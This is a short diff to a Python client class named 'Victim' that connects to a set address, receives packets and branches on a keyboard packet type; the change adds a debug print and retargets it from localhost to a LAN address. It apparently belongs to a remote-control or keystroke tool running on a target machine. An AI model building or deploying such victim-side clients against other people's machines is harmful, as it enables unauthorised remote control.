@@ -19,8 +19,8 @@ class Victim:
 
         try:
             self.victim.connect(self.ADDR)
+            print('connected')
             connected = True
-
             while connected:
                 packet_type, packet_payload = HandelPacket.recv_packet(self.victim)
                 if packet_type == PacketType.KEYBOARD.value:
@@ -32,5 +32,6 @@ class Victim:
             print(e)
 
 
+
 if __name__ == '__main__':
-    Victim('127.0.0.1', 1245).main()
+    Victim('192.168.1.125', 1111).main()
